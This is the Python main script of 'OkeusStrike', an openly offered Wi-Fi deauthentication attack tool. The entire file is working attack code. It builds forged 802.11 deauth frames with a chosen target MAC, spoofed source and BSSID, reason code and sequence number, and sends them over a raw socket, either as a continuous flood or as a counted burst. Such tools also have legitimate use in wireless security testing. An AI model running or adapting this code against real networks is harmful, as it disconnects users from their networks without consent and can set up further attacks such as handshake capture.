#!/usr/bin/env python3

# OkeusStrike - Advanced Deauthentication Attack Tool - okeus
# Copyright (C) 2025 Richard Smith (Islc12)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

import socket
import sys 
import time
import struct
from src import (
    assemble,
    body,
    convert,
    exit,
    fragseq,
    okeusargs,
    radio,
    reason,
    syschecks,
    verbose
)
from images import okeus_ascii

args = okeusargs.parse_arguments()
okeus_ascii.art()
dr = "Conducting dry run, no frames will be sent."

def main():
    dry = args.dryrun
    interface = args.netinterface
    ver = args.verbose
    body_bytes = args.body_pad
    frame_flood = args.flood
    num_frames = args.count
    timedelay = args.delay

    syschecks.sys_checks()

    f_ctl, f_frag, f_dur, ct, src, net, ch, src_n_v = assemble.f_assem(dest_mac=args.dest, broadcast_attack=args.broadcast, source_mac=args.ap_source, network_bssid=args.net_bssid, frag=args.fragment, dur=args.duration, randfrag=args.randomfrag)
    radiotap_header, it_version, it_pad, it_len, it_present = radio.ieee80211_radiotap_header()
    df = radiotap_header + f_ctl + f_frag + f_dur + ct + src + net
    r = reason.reas(args.reason_code)
    sq = fragseq.fs(frag=args.fragment, seq_num=args.sequence, randfrag=args.randomfrag, autoseq=args.autoseq)
    b = body.body_inject(body_bytes)
    frame = b"".join(part for part in [df, sq, r, b] if part is not None)
    frme = frame.hex().upper()
    frmes = ''.join([f'\\x{frme[i:i+2]}' for i in range(0, len(frme), 2)])

    if not dry:
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            s.bind((interface, 0))
            if ver:
                print(s)
        except OSError as es:
            if es.errno == 19:
                print("Unknown network interface")
                sys.exit(exit.EXIT_UNKNOWN_INTERFACE)
            else:
                print(es)
                sys.exit(exit.EXIT_OSERROR)
    elif dry:
        print(dr)
    
    print(f'Frame: {frmes}')

    if frame_flood:
        nmframe = 1

        if ver:
            verbose.verb(interface=args.netinterface, source_mac=args.ap_source, reason_code=args.reason_code, randfrag=args.randomfrag, autoseq=args.autoseq, body_bytes=args.body_pad)
        try:
            tg = ct.hex().upper()
            tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
            print("Starting flood attack") 
            print(f"Flooding target: {tgt}\nEnd attack with CTRL + C")
            if num_frames:
                n = num_frames
                print(f"Sending {n} frames.")
            elif not num_frames:
                n = -1

            if timedelay:
                t = timedelay / 1000
                print(f"Delay of {timedelay} ms")
            elif not timedelay:
                t = .1
            while nmframe != n:
                try:
                    if not dry:
                        s.send(frame)
                    time.sleep(t)
                    nmframe += 1
                except OSError as eos:
                    if eos.errno == 100:
                        time.sleep(1)
                        continue
        except KeyboardInterrupt:
            print("\nEnding flood attack")

        except Exception as e:
            print(f"Error: {e}")

        finally:
            print(f"Sent {nmframe} frames to {tgt}")
            if not dry:
                if ver:
                    print(f"Socket {s} closed")
                s.close()
            if Exception:
                sys.exit(exit.EXIT_OSERROR)
            print("Completed!!!")

    if not frame_flood:
        if timedelay:
            t = timedelay / 1000
            ti = timedelay
        if not timedelay:
            if ver:
                print("Default setting is no delay between frames")
            ti = 0
            t = ti
        if num_frames:
            n = num_frames
        if not num_frames:
            if verbose:
                print("Default setting sends 1 frame")
            n = 1
        try:
            if ver:
                verbose.verb(interface=None, source_mac=None, reason_code=None, randfrag=False, autoseq=False, body_bytes=None)
            if timedelay:
                print(f"Sending {n} frame(s) at a rate of {ti} ms.")
            if not timedelay:
                print(f"Sending {n} frame(s)")
            print("Starting deauth attack")
            for i in range(n):
                try:
                    if not dry:
                        s.send(frame)
                    if ver:
                        print(f"Sending frame: {i + 1}/{n}")
                        if timedelay:
                            if ti == 0:
                                print("")
                            elif 0 < ti < 1000:
                                print(f"Waiting {ti} ms...")
                            elif ti >= 1000:
                                print(f"Waiting {ti / 1000} second(s)...")
                    time.sleep(t)
                except OSError as eos:
                    if eos.errno == 100:
                        time.sleep(1)
                        continue
        except KeyboardInterrupt:
            print("\n")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            if not dry:
                if ver:
                    print(f"Socket {s} closed")
                s.close()
            if Exception:
                sys.exit(exit.EXIT_OSERROR)
            else:
                print("Completed!!!")
                sys.exit(exit.EXIT_SUCCESS)

if __name__ == "__main__":
    main()